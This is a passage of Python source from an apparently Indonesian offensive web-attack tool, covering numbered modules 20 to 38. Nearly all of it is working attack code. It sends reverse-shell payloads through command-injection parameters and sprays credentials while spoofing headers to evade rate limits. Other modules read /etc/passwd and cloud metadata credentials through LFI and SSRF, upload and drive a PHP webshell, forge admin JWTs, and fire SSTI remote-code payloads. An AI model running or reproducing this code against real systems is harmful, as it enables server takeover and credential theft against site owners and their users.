    info(f"Reverse Shell Dropper → {url}")
    lhost = input(C["w"] + "  LHOST (IP attacker) » ").strip()
    lport = input(C["w"] + "  LPORT (port listener) » ").strip()
    data  = {"url": url, "lhost": lhost, "lport": lport,
             "vuln_param": None, "shell_sent": [], "success": False}

    # langkah 1: deteksi parameter vulnerable
    vuln_param = None
    for param in CMD_PARAMS:
        target = f"{url}?{param}=id"
        try:
            r = req_get(target, timeout=6, verify=False, headers=HEADERS)
            if any(s in r.text for s in CMD_SIGNS):
                vuln_param = param
                hit(f"Param vulnerable: ?{param}=")
                break
        except:
            pass

    if not vuln_param:
        miss("Tidak ada parameter CMDi yang ditemukan")
        store("Reverse Shell Drop", data); return

    data["vuln_param"] = vuln_param

    # langkah 2: kirim tiap payload shell
    for pl_template in SHELL_PAYLOADS:
        pl     = pl_template.format(ip=lhost, port=lport)
        encoded = requests.utils.quote(pl)
        target  = f"{url}?{vuln_param}={encoded}"
        try:
            r = req_get(target, timeout=4, verify=False, headers=HEADERS)
            warn(f"Shell payload sent → {pl[:60]}...")
            data["shell_sent"].append(pl)
            data["success"] = True
        except:
            pass

    if data["success"]:
        warn(f"Payload dikirim. Pastikan listener aktif: nc -lvnp {lport}")
    store("Reverse Shell Drop", data)

# 21 — Credential Spray
def credential_spray(url):
    info(f"Credential Spray → {url}")
    login_path = input(C["w"] + "  Login path (contoh: /login) » ").strip()
    user_file  = input(C["w"] + "  File username (kosong = default) » ").strip()
    pass_file  = input(C["w"] + "  File password (kosong = default) » ").strip()
    target     = url.rstrip("/") + login_path
    data       = {"url": target, "hits": [], "tested": 0, "success": False}

    default_users  = ["admin","administrator","root","user","test","guest","manager","operator"]
    default_passes = ["admin","password","123456","password1","admin123","letmein",
                      "welcome","monkey","dragon","master","qwerty","abc123",""]

    users  = open(user_file).read().splitlines() if user_file and os.path.exists(user_file) else default_users
    passes = open(pass_file).read().splitlines() if pass_file and os.path.exists(pass_file) else default_passes

    # rotasi user-agent untuk bypass rate limit sederhana
    ua_pool = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
        "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14) Safari/605.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Mobile/15E148",
        "python-requests/2.31.0",
    ]
    fail_signs = ["invalid","incorrect","wrong","failed","error","unauthorized","denied"]

    for i, (usr, pwd) in enumerate([(u, p) for u in users for p in passes]):
        ua = ua_pool[i % len(ua_pool)]
        h  = {**HEADERS, "User-Agent": ua, "X-Forwarded-For": f"10.0.0.{(i%254)+1}"}
        try:
            rp = req_post(
                target,
                data={"username": usr, "password": pwd, "user": usr, "pass": pwd},
                timeout=5, verify=False, headers=h, allow_redirects=True)
            data["tested"] += 1
            if rp.status_code in [200,302] and not any(s in rp.text.lower() for s in fail_signs):
                warn(f"HIT → {usr}:{pwd}")
                data["hits"].append({"user": usr, "pass": pwd, "status": rp.status_code})
                data["success"] = True
            else:
                miss(f"{usr}:{pwd}")
            time.sleep(0.15)  # jitter minimal
        except:
            pass

    print(C["c"] + f"\n  Tested: {data['tested']} | Hits: {len(data['hits'])}")
    store("Credential Spray", data)

# 22 — LFI Probe
LFI_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    # null byte (PHP < 5.3)
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.php",
    # encoding bypass
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    # double slash
    "....//....//....//etc/passwd",
    # windows
    "..\\..\\..\\windows\\win.ini",
    "..%5C..%5C..%5Cwindows%5Cwin.ini",
    # PHP filter wrapper
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=string.toupper/resource=/etc/passwd",
    # proc self
    "/proc/self/environ",
    "/proc/self/cmdline",
]
LFI_SIGNS = ["root:x:","bin:x:","daemon:x:","[boot loader]","[fonts]",
             "HTTP_USER_AGENT","DOCUMENT_ROOT","cmdline"]
LFI_PARAMS = ["file","page","include","path","template","doc","view",
              "content","load","read","lang","language"]

def lfi_probe(url):
    info(f"LFI Probe → {url}")
    data = {"url": url, "vulnerable": [], "tested": 0, "success": False}
    for param in LFI_PARAMS:
        for pl in LFI_PAYLOADS:
            target = f"{url}?{param}={pl}"
            try:
                r = req_get(target, timeout=6, verify=False, headers=HEADERS)
                data["tested"] += 1
                if any(s in r.text for s in LFI_SIGNS):
                    warn(f"LFI HIT → ?{param}={pl[:50]}")
                    data["vulnerable"].append({"param": param, "payload": pl,
                                               "snippet": r.text[:200]})
                    data["success"] = True
                    break  # param ini vuln, lanjut param berikutnya
            except:
                pass
    print(C["c"] + f"\n  Tested: {data['tested']} | Hits: {len(data['vulnerable'])}")
    store("LFI Probe", data)

# 23 — Open Redirect Scanner
REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "////evil.com",
    "/\\evil.com",
    "https:evil.com",
    "%2F%2Fevil.com",
    "https%3A%2F%2Fevil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
]
REDIRECT_PARAMS = ["url","redirect","next","return","goto","target","dest",
                   "destination","redir","location","continue","back","forward"]

def open_redirect_scan(url):
    info(f"Open Redirect Scan → {url}")
    data = {"url": url, "vulnerable": [], "tested": 0, "success": False}
    for param in REDIRECT_PARAMS:
        for pl in REDIRECT_PAYLOADS:
            target = f"{url}?{param}={requests.utils.quote(pl)}"
            try:
                r = req_get(target, timeout=5, verify=False,
                                 headers=HEADERS, allow_redirects=False)
                data["tested"] += 1
                loc = r.headers.get("Location","")
                if r.status_code in [301,302,303,307,308] and "evil.com" in loc:
                    warn(f"OPEN REDIRECT → ?{param}={pl} → {loc}")
                    data["vulnerable"].append({"param": param, "payload": pl, "location": loc})
                    data["success"] = True
                else:
                    miss(f"{r.status_code} → ?{param}={pl[:30]}")
            except:
                pass
    print(C["c"] + f"\n  Tested: {data['tested']} | Hits: {len(data['vulnerable'])}")
    store("Open Redirect Scan", data)

# 24 — SSRF Probe
SSRF_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",           # AWS
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",# GCP
    "http://169.254.169.254/metadata/v1/",                # DigitalOcean
    "http://100.100.100.200/latest/meta-data/",           # Alibaba
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:8443/",
    "http://127.0.0.1:3306/",     # MySQL
    "http://127.0.0.1:6379/",     # Redis
    "http://127.0.0.1:27017/",    # MongoDB
    "dict://127.0.0.1:6379/info", # Redis via dict://
    "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",  # Redis via gopher
    "file:///etc/passwd",
    "file:///etc/hostname",
]
SSRF_PARAMS = ["url","target","src","source","fetch","load","request",
               "uri","path","endpoint","proxy","host","server"]
SSRF_SIGNS  = ["ami-id","instance-id","computeMetadata","root:x:",
               "hostname","redis_version","mongod","Connected"]

def ssrf_probe(url):
    info(f"SSRF Probe → {url}")
    data = {"url": url, "vulnerable": [], "tested": 0, "success": False}
    gcp_headers = {**HEADERS, "Metadata-Flavor": "Google"}
    for param in SSRF_PARAMS:
        for ssrf_target in SSRF_TARGETS:
            target = f"{url}?{param}={requests.utils.quote(ssrf_target)}"
            try:
                h = gcp_headers if "google" in ssrf_target else HEADERS
                r = req_get(target, timeout=6, verify=False, headers=h)
                data["tested"] += 1
                if any(s in r.text for s in SSRF_SIGNS) or r.status_code == 200 and len(r.text) > 50:
                    warn(f"SSRF HIT → ?{param}={ssrf_target[:50]}")
                    data["vulnerable"].append({
                        "param": param, "ssrf_target": ssrf_target,
                        "status": r.status_code, "snippet": r.text[:300]})
                    data["success"] = True
                else:
                    miss(f"{r.status_code} → ?{param}={ssrf_target[:30]}")
            except:
                pass
    print(C["c"] + f"\n  Tested: {data['tested']} | Hits: {len(data['vulnerable'])}")
    store("SSRF Probe", data)

# ══════════════════════════════════════════
#  METODE BARU (25-35)
# ══════════════════════════════════════════

# 25 — File Upload Bypass
UPLOAD_PATHS = ["/upload", "/uploads", "/file", "/files", "/media",
                "/assets", "/attachments", "/images", "/img", "/avatar"]
WEBSHELL_PHP = '<?php if(isset($_REQUEST["c"])){echo "<pre>";system($_REQUEST["c"]);echo "</pre>";} ?>'
BYPASS_NAMES = [
    ("shell.php",           "application/octet-stream"),
    ("shell.php.jpg",       "image/jpeg"),
    ("shell.php5",          "application/octet-stream"),
    ("shell.phtml",         "application/octet-stream"),
    ("shell.pHp",           "application/octet-stream"),
    ("shell.php%00.jpg",    "image/jpeg"),
    ("shell.php::$DATA",    "application/octet-stream"),
    (".shell.php",          "application/octet-stream"),
    ("shell.jpg",           "image/jpeg"),   # MIME hanya jpg tapi isi PHP
]

def file_upload_bypass(url):
    info(f"File Upload Bypass → {url}")
    data = {"url": url, "uploaded": [], "shells": [], "success": False}
    for path in UPLOAD_PATHS:
        endpoint = url.rstrip("/") + path
        try:
            r = req_get(endpoint, timeout=4, verify=False, headers=HEADERS)
            if r.status_code not in [200, 302, 301]:
                continue
            hit(f"Upload endpoint ditemukan → {endpoint}")
            for fname, mime in BYPASS_NAMES:
                try:
                    files = {"file": (fname, WEBSHELL_PHP, mime)}
                    rp = req_post(endpoint, files=files, timeout=6,
                                       verify=False, headers=HEADERS)
                    if rp.status_code in [200, 201, 302]:
                        # cari URL shell di response
                        urls_found = re.findall(
                            r'(?:href|src|url)["\s:=]+([^\s"<>]+\.php[^\s"<>]*)', rp.text)
                        if urls_found:
                            shell_url = urls_found[0]
                            if not shell_url.startswith("http"):
                                shell_url = url.rstrip("/") + "/" + shell_url.lstrip("/")
                            warn(f"SHELL UPLOADED → {shell_url}")
                            # verifikasi shell aktif
                            rv = req_get(shell_url + "?c=id",
                                              timeout=5, verify=False, headers=HEADERS)
                            if any(s in rv.text for s in ["uid=","root","www-data"]):
                                warn(f"SHELL ACTIVE → {shell_url}?c=<cmd>")
                                data["shells"].append(shell_url)
                        data["uploaded"].append({"endpoint": endpoint, "name": fname,
                                                  "status": rp.status_code})
                        data["success"] = True
                    else:
                        miss(f"{rp.status_code} → {fname}")
                except:
                    pass
        except:
            pass
    store("File Upload Bypass", data)

# 26 — SSTI (Server-Side Template Injection)
SSTI_PAYLOADS = {
    "{{7*7}}":           "49",
    "${7*7}":            "49",
    "<%= 7*7 %>":        "49",
    "#{7*7}":            "49",
    "{{7*'7'}}":         "7777777",    # Jinja2
    "${\"freemarker\"?upper_case}": "FREEMARKER",
    "{{config}}":        "Config",
    "{{self}}":          "TemplateReference",
    # RCE Jinja2
    "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}": "uid=",
    # RCE Twig
    "{{['id']|filter('system')}}": "uid=",
}
SSTI_PARAMS = ["name","search","q","query","msg","message","template",
               "input","text","content","title","page"]

def ssti_probe(url):
    info(f"SSTI Probe → {url}")
    data = {"url": url, "vulnerable": [], "rce": [], "tested": 0, "success": False}
    for param in SSTI_PARAMS:
        for pl, expected in SSTI_PAYLOADS.items():
            target = f"{url}?{param}={requests.utils.quote(pl)}"
            try:
                r = req_get(target, timeout=6, verify=False, headers=HEADERS)
                data["tested"] += 1
                if expected in r.text:
                    if "uid=" in expected:
                        warn(f"SSTI RCE → ?{param}={pl[:40]}")
                        data["rce"].append({"param": param, "payload": pl})
                    else:
                        warn(f"SSTI DETECTED → ?{param}={pl} → {expected}")
                        data["vulnerable"].append({"param": param, "payload": pl,
                                                   "expected": expected})
                    data["success"] = True
            except:
                pass
    store("SSTI Probe", data)

# 27 — HTTP Request Smuggling
SMUGGLE_PAYLOADS = [
    # CL.TE
    b"POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED",
    # TE.CL
    b"POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n6\r\nSMUGGLE\r\n0\r\n\r\n",
    # TE.TE obfuscated
    b"POST / HTTP/1.1\r\nHost: TARGET\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: identity\r\n\r\n0\r\n\r\n",
]

def http_smuggling(url):
    info(f"HTTP Request Smuggling → {url}")
    domain = get_domain(url)
    port   = 443 if url.startswith("https") else 80
    data   = {"url": url, "vulnerable": [], "success": False}
    for i, raw in enumerate(SMUGGLE_PAYLOADS):
        raw = raw.replace(b"TARGET", domain.encode())
        try:
            import ssl
            if port == 443:
                ctx  = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                s = socket.socket()
                s.settimeout(6)
                s.connect((domain, port))
                s = ctx.wrap_socket(s, server_hostname=domain)
            else:
                s = socket.socket()
                s.settimeout(6)
                s.connect((domain, port))
            s.send(raw)
            resp = s.recv(4096).decode(errors="ignore")
            s.close()
            if "SMUGGLED" in resp or "400" not in resp[:20]:
                warn(f"POSSIBLE SMUGGLE → payload #{i+1}")
                data["vulnerable"].append(f"payload_{i+1}")
                data["success"] = True
            else:
                miss(f"payload #{i+1} → no sign")
        except Exception as e:
            miss(f"payload #{i+1} → {e}")
    store("HTTP Request Smuggling", data)

# 28 — CORS Misconfiguration
CORS_ORIGINS = [
    "https://evil.com",
    "https://target.evil.com",
    "null",
    "https://evil.com.target.com",
]

def cors_misconfig(url):
    info(f"CORS Misconfiguration → {url}")
    data = {"url": url, "vulnerable": [], "success": False}
    for origin in CORS_ORIGINS:
        h = {**HEADERS, "Origin": origin}
        try:
            r   = req_get(url, timeout=6, verify=False, headers=h)
            acao = r.headers.get("Access-Control-Allow-Origin","")
            acac = r.headers.get("Access-Control-Allow-Credentials","")
            if acao == "*":
                warn(f"CORS wildcard → ACAO: *")
                data["vulnerable"].append({"origin": origin, "acao": acao, "acac": acac})
                data["success"] = True
            elif origin in acao or acao == "null":
                if acac.lower() == "true":
                    warn(f"CORS + Credentials → ACAO: {acao} | ACAC: {acac}")
                    data["vulnerable"].append({"origin": origin, "acao": acao, "acac": acac})
                    data["success"] = True
                else:
                    info(f"CORS reflected tapi no credentials → {acao}")
            else:
                miss(f"origin {origin} → {acao or 'not reflected'}")
        except Exception as e:
            miss(str(e))
    store("CORS Misconfiguration", data)

# 29 — Auto Webshell Manager
def webshell_manager(url):
    info(f"Webshell Manager → {url}")
    shell_url = input(C["w"] + "  Shell URL (contoh: https://target.com/uploads/shell.php) » ").strip()
    data = {"shell_url": shell_url, "commands": [], "success": False}
    print(C["y"] + "  [*] Ketik 'exit' untuk keluar. Shell aktif:")
    while True:
        cmd = input(C["r"] + C["B"] + "  shell» " + C["x"]).strip()
        if cmd.lower() in ["exit","quit","q"]:
            break
        if not cmd:
            continue
        try:
            r = req_get(shell_url, params={"c": cmd},
                             timeout=8, verify=False, headers=HEADERS)
            output = re.sub(r'<[^>]+>', '', r.text).strip()
            print(C["g"] + output + C["x"])
            data["commands"].append({"cmd": cmd, "output": output[:500]})
            data["success"] = True
        except Exception as e:
            miss(str(e))
    store("Webshell Manager", data)

# 30 — JWT Attack
import hmac, hashlib

JWT_WEAK_SECRETS = [
    "secret","password","123456","admin","key","jwt","token",
    "supersecret","mysecret","changeme","default","test","qwerty",
    "","your-256-bit-secret","your-secret-key",
]

def jwt_attack(url):
    info(f"JWT Attack → {url}")
    if not JWT_TOKENS:
        miss("JWT Hunter tidak menemukan token di response target — skip")
        store("JWT Attack", {"attacks": [], "success": False, "skipped": True})
        return
    results_all = []
    for jwt_input in JWT_TOKENS:
        hit(f"Attacking token → {jwt_input[:40]}...")
        data = {"jwt": jwt_input, "attacks": [], "success": False}
        _jwt_single(url, jwt_input, data)
        results_all.append(data)
    store("JWT Attack", {"all": results_all, "success": any(d["success"] for d in results_all)})

def _jwt_single(url, jwt_input, data):
    # decode header + payload
    try:
        parts = jwt_input.split(".")
        if len(parts) != 3:
            miss("Bukan format JWT valid"); store("JWT Attack", data); return
        pad = lambda s: s + "=" * (-len(s) % 4)
        header  = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
        payload = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
        hit(f"Header  : {header}")
        hit(f"Payload : {payload}")
    except Exception as e:
        miss(f"Decode error: {e}"); store("JWT Attack", data); return

    # attack 1: alg:none
    none_header  = base64.urlsafe_b64encode(
        json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
    orig_payload = parts[1]
    none_token   = f"{none_header}.{orig_payload}."
    warn(f"alg:none token → {none_token}")
    data["attacks"].append({"type": "alg:none", "token": none_token})
    data["success"] = True

    # attack 2: weak secret bruteforce (HS256)
    alg = header.get("alg","")
    if alg == "HS256":
        sign_input = f"{parts[0]}.{parts[1]}".encode()
        orig_sig   = base64.urlsafe_b64decode(pad(parts[2]))
        for secret in JWT_WEAK_SECRETS:
            sig = hmac.new(secret.encode(), sign_input, hashlib.sha256).digest()
            if sig == orig_sig:
                warn(f"WEAK SECRET FOUND → '{secret}'")
                data["attacks"].append({"type": "weak_secret", "secret": secret})
                # forge admin token
                p2 = dict(payload); p2["role"] = "admin"; p2["admin"] = True
                new_pl  = base64.urlsafe_b64encode(
                    json.dumps(p2).encode()).rstrip(b"=").decode()
                new_sig = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(),
                              f"{parts[0]}.{new_pl}".encode(),
                              hashlib.sha256).digest()).rstrip(b"=").decode()
                forged = f"{parts[0]}.{new_pl}.{new_sig}"
                warn(f"FORGED ADMIN TOKEN → {forged}")
                data["attacks"].append({"type": "forged_admin", "token": forged})
                break

    # attack 3: kid injection (SQL)
    if "kid" in header:
        evil_kid    = "' UNION SELECT 'secret'--"
        evil_header = dict(header); evil_header["kid"] = evil_kid
        kid_h = base64.urlsafe_b64encode(
            json.dumps(evil_header).encode()).rstrip(b"=").decode()
        kid_sig = base64.urlsafe_b64encode(
            hmac.new(b"secret",
                      f"{kid_h}.{parts[1]}".encode(),
                      hashlib.sha256).digest()).rstrip(b"=").decode()
        kid_token = f"{kid_h}.{parts[1]}.{kid_sig}"
        warn(f"kid SQLi token → {kid_token}")
        data["attacks"].append({"type": "kid_sqli", "token": kid_token})

    # test semua token ke URL
    for atk in data["attacks"]:
        if "token" in atk:
            try:
                h = {**HEADERS, "Authorization": f"Bearer {atk['token']}",
                     "Cookie": f"token={atk['token']}"}
                r = req_get(url, timeout=5, verify=False, headers=h)
                info(f"[{atk['type']}] → {r.status_code} ({len(r.text)} bytes)")
            except:
                pass

    # results stored by caller

# 31 — GraphQL Introspection
GRAPHQL_PATHS = ["/graphql","/api/graphql","/v1/graphql","/query","/gql"]
INTROSPECT_QUERY = '{"query":"{__schema{types{name fields{name}}}}"}'
MUTATION_PROBE   = '{"query":"mutation{__typename}"}'

def graphql_introspection(url):
    info(f"GraphQL Introspection → {url}")
    data = {"url": url, "endpoints": [], "types": [], "mutations": [], "success": False}
    gql_headers = {**HEADERS, "Content-Type": "application/json"}
    for path in GRAPHQL_PATHS:
        endpoint = url.rstrip("/") + path
        try:
            r = req_post(endpoint, data=INTROSPECT_QUERY,
                              timeout=6, verify=False, headers=gql_headers)
            if r.status_code == 200 and "__schema" in r.text:
                warn(f"GRAPHQL INTROSPECTION OPEN → {endpoint}")
                data["endpoints"].append(endpoint)
                data["success"] = True
                schema = r.json()
                types  = schema.get("data",{}).get("__schema",{}).get("types",[])
                for t in types:
                    if t.get("name") and not t["name"].startswith("__"):
                        data["types"].append(t["name"])
                        hit(f"Type: {t['name']}")
                # cek mutation
                rm = req_post(endpoint, data=MUTATION_PROBE,
                                   timeout=5, verify=False, headers=gql_headers)
                if rm.status_code == 200 and "mutation" in rm.text.lower():
                    warn("Mutations tersedia")
                    data["mutations"].append("mutation endpoint open")
            else:
                miss(f"{r.status_code} → {path}")
        except:
            pass
    store("GraphQL Introspection", data)

# 32 — Prototype Pollution
PROTO_PAYLOADS = [
    '{"__proto__":{"polluted":"true"}}',
    '{"constructor":{"prototype":{"polluted":"true"}}}',
    '{"__proto__":{"isAdmin":true}}',
    '{"__proto__":{"role":"admin"}}',
]
PROTO_PARAMS = ["json","data","body","input","config","options","settings"]

def prototype_pollution(url):
    info(f"Prototype Pollution → {url}")
    data = {"url": url, "vulnerable": [], "tested": 0, "success": False}
    json_headers = {**HEADERS, "Content-Type": "application/json"}
    for param in PROTO_PARAMS:
        for pl in PROTO_PAYLOADS:
            try:
                # POST JSON body
                r = req_post(url, data=pl, timeout=5,
                                  verify=False, headers=json_headers)
                data["tested"] += 1
                if "polluted" in r.text or "isAdmin" in r.text or r.status_code == 500:
                    warn(f"PROTO POLLUTION → {pl[:50]}")
                    data["vulnerable"].append({"payload": pl, "status": r.status_code})
                    data["success"] = True
                # GET param
                target = f"{url}?{param}={requests.utils.quote(pl)}"
                r2 = req_get(target, timeout=5, verify=False, headers=HEADERS)
                if "polluted" in r2.text:
                    warn(f"PROTO POLLUTION (GET) → ?{param}={pl[:40]}")
                    data["vulnerable"].append({"param": param, "payload": pl})
                    data["success"] = True
            except:
                pass
    store("Prototype Pollution", data)

# 33 — Google Dork Automation
DORKS = [
    'site:{domain} filetype:sql',
    'site:{domain} filetype:env',
    'site:{domain} inurl:admin',
    'site:{domain} inurl:login',
    'site:{domain} intitle:"index of"',
    'site:{domain} inurl:config',
    'site:{domain} inurl:backup',
    'site:{domain} filetype:log',
    'site:{domain} inurl:phpinfo',
    'site:{domain} inurl:wp-config',
    'site:{domain} "db_password"',
    'site:{domain} "api_key"',
    'site:{domain} "secret_key"',
]

def google_dork(url):
    domain = get_domain(url)
    info(f"Google Dork Automation → {domain}")
    data = {"domain": domain, "dorks": [], "results": [], "success": False}
    print(C["y"] + "  [*] Dork queries untuk dijalankan manual di Google / DuckDuckGo:\n")
    for tmpl in DORKS:
        dork = tmpl.replace("{domain}", domain)
        data["dorks"].append(dork)
        print(C["g"] + f"  → {dork}")

    # coba via DuckDuckGo HTML scrape (no API key needed)
    print()
    info("Mencoba DuckDuckGo scrape...")
    for tmpl in DORKS[:5]:  # limit 5 buat menghindari block
        dork = tmpl.replace("{domain}", domain)
        try:
            ddg_url = f"https://html.duckduckgo.com/html/?q={requests.utils.quote(dork)}"
            r = req_get(ddg_url, timeout=8, verify=False, headers=HEADERS)
            links = re.findall(r'<a[^>]+class="result__url"[^>]*>([^<]+)<', r.text)
            for link in links[:3]:
                link = link.strip()
                if domain in link:
                    hit(f"Found → {link}")
                    data["results"].append(link)
                    data["success"] = True
        except:
            pass
        time.sleep(1)  # jangan kena block

    store("Google Dork", data)

# 34 — Wayback Machine Scraper
def wayback_scraper(url):
    domain = get_domain(url)
    info(f"Wayback Scraper → {domain}")
    data = {"domain": domain, "urls": [], "interesting": [], "success": False}
    try:
        wb_url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original&collapse=urlkey&limit=200"
        r = req_get(wb_url, timeout=15, verify=False, headers=HEADERS)
        if r.status_code == 200:
            rows = r.json()
            urls = [row[0] for row in rows[1:] if row]  # skip header row
            data["urls"]    = urls
            data["success"] = True
            hit(f"Total URL historis: {len(urls)}")
            # filter yang menarik
            interesting_ext  = [".php",".sql",".env",".bak",".zip",".tar",".log",".config"]
            interesting_path = ["admin","login","backup","config","upload","api","debug","test"]
            for u in urls:
                u_low = u.lower()
                if any(ext in u_low for ext in interesting_ext) or \
                   any(p in u_low for p in interesting_path):
                    data["interesting"].append(u)
                    hit(f"Interesting → {u}")
            warn(f"Interesting URLs: {len(data['interesting'])}")
        else:
            miss(f"Wayback API → {r.status_code}")
    except Exception as e:
        miss(str(e))
    store("Wayback Scraper", data)

# 35 — JS File Analyzer
JS_SECRET_PATTERNS = {
    "API Key"       : r'(?:api[_-]?key|apikey)["\s:=]+["\']([A-Za-z0-9_\-]{20,})',
    "AWS Key"       : r'AKIA[0-9A-Z]{16}',
    "AWS Secret"    : r'(?:aws[_-]?secret)["\s:=]+["\']([A-Za-z0-9/+=]{40})',
    "JWT Token"     : r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
    "Private Key"   : r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',
    "Password"      : r'(?:password|passwd|pwd)["\s:=]+["\']([^\s"\']{6,})',
    "Secret Key"    : r'(?:secret[_-]?key|secret)["\s:=]+["\']([A-Za-z0-9_\-]{8,})',
    "Google API"    : r'AIza[0-9A-Za-z_\-]{35}',
    "GitHub Token"  : r'gh[pousr]_[A-Za-z0-9]{36}',
    "Endpoint"      : r'(?:fetch|axios|http\.get|http\.post)\(["\']([^"\']+)["\']',
    "Internal URL"  : r'https?://(?:localhost|127\.0\.0\.1|10\.|192\.168\.|172\.(?:1[6-9]|2[0-9]|3[01])\.)[^\s"\']+',
}

def js_analyzer(url):
    info(f"JS File Analyzer → {url}")
    data = {"url": url, "js_files": [], "findings": [], "success": False}
    try:
        r    = req_get(url, timeout=10, verify=False, headers=HEADERS)
        body = r.text
        # kumpulkan semua JS src
        js_srcs = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', body)
        hit(f"JS files ditemukan: {len(js_srcs)}")
        data["js_files"] = js_srcs
        for src in js_srcs[:20]:  # limit 20
            if not src.startswith("http"):
                src = url.rstrip("/") + "/" + src.lstrip("/")
            try:
                rj = req_get(src, timeout=8, verify=False, headers=HEADERS)
                js_content = rj.text
                for label, pattern in JS_SECRET_PATTERNS.items():
                    matches = re.findall(pattern, js_content, re.IGNORECASE)
                    for m in matches[:5]:
                        warn(f"[{label}] {src.split('/')[-1]} → {str(m)[:80]}")
                        data["findings"].append({"file": src, "type": label, "value": str(m)[:200]})
                        data["success"] = True
            except:
                pass
    except Exception as e:
        miss(str(e))
    store("JS File Analyzer", data)

# ══════════════════════════════════════════
#  METODE BARU (36-50)
# ══════════════════════════════════════════

# 36 — XML Injection
XML_PAYLOADS = [
    "<name>test</name>",
    "<name>test<injected>pwn</injected></name>",
    "<name><!--comment--></name>",
    "<name><![CDATA[<script>alert(1)</script>]]></name>",
    "<name>&lt;script&gt;alert(1)&lt;/script&gt;</name>",
    '<?xml version="1.0"?><root><user>admin</user><role>superuser</role></root>',
    "<search><query>test' OR '1'='1</query></search>",
]
XML_SIGNS = ["injected","pwn","superuser","error","exception","xml","parse"]

def xml_injection(url):
    info(f"XML Injection → {url}")
    data = {"url": url, "vulnerable": [], "tested": 0, "success": False}
    xml_h = {**HEADERS, "Content-Type": "application/xml"}
    for pl in XML_PAYLOADS:
        try:
            r = req_post(url, data=pl, timeout=6, verify=False, headers=xml_h)
            data["tested"] += 1
            if any(s in r.text.lower() for s in XML_SIGNS):
                warn(f"XML INJECTION → {pl[:60]}")
                data["vulnerable"].append({"payload": pl, "status": r.status_code,
                                           "snippet": r.text[:200]})
                data["success"] = True
            else:
                miss(f"clean → {pl[:40]}")
        except Exception as e:
            miss(str(e))
    store("XML Injection", data)

# 37 — CRLF Injection
CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie: crlf=injected",
    "%0aSet-Cookie: crlf=injected",
    "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK",
    "%0d%0aX-Injected: yes",
    "%0d%0aLocation: https://evil.com",
    "/%0d%0aSet-Cookie:%20crlf=injected",
    "%E5%98%8D%E5%98%8ASet-Cookie: crlf=injected",  # unicode bypass
]
CRLF_PARAMS = ["url","redirect","next","return","path","page","ref","data"]

def crlf_injection(url):
    info(f"CRLF Injection → {url}")
    data = {"url": url, "vulnerable": [], "tested": 0, "success": False}
    for param in CRLF_PARAMS:
        for pl in CRLF_PAYLOADS:
            target = f"{url}?{param}={pl}"
            try:
                r = req_get(target, timeout=5, verify=False,
                            headers=HEADERS, allow_redirects=False)
                data["tested"] += 1
                resp_headers = dict(r.headers)
                if "crlf" in str(resp_headers).lower() or \
                   "injected" in str(resp_headers).lower() or \
                   "X-Injected" in resp_headers:
                    warn(f"CRLF HIT → ?{param}={pl[:40]}")
                    data["vulnerable"].append({"param": param, "payload": pl,
                                               "headers": resp_headers})
                    data["success"] = True
                else:
                    miss(f"clean → ?{param}={pl[:30]}")
            except:
                pass
    store("CRLF Injection", data)

# 38 — Host Header Injection
HOST_PAYLOADS = [
    "evil.com",
    "evil.com:80",
    "localhost",
    "127.0.0.1",
    "target.com.evil.com",
    "evil.com%0d%0aX-Injected: yes",
]
HOST_SIGNS = ["evil.com","reset","password","forgot","token","injected"]

def host_header_injection(url):
    info(f"Host Header Injection → {url}")
    data = {"url": url, "vulnerable": [], "tested": 0, "success": False}
    domain = get_domain(url)
    # endpoint yang sering vuln: password reset
    endpoints = [url, url.rstrip("/")+"/forgot-password",
                 url.rstrip("/")+"/reset-password",
                 url.rstrip("/")+"/account/recover"]
    for endpoint in endpoints:
        for evil_host in HOST_PAYLOADS:
            h = {**HEADERS, "Host": evil_host,
                 "X-Forwarded-Host": evil_host,
                 "X-Host": evil_host,
                 "X-Forwarded-Server": evil_host}
            try:
                r = req_get(endpoint, timeout=5, verify=False, headers=h)
                data["tested"] += 1
                if any(s in r.text.lower() for s in HOST_SIGNS) and evil_host in r.text:
                    warn(f"HOST HEADER INJECT → {endpoint} | Host: {evil_host}")
                    data["vulnerable"].append({"endpoint": endpoint, "host": evil_host,
                                               "snippet": r.text[:200]})
                    data["success"] = True
                else:
                    miss(f"{endpoint} | Host: {evil_host}")
            except:
                pass
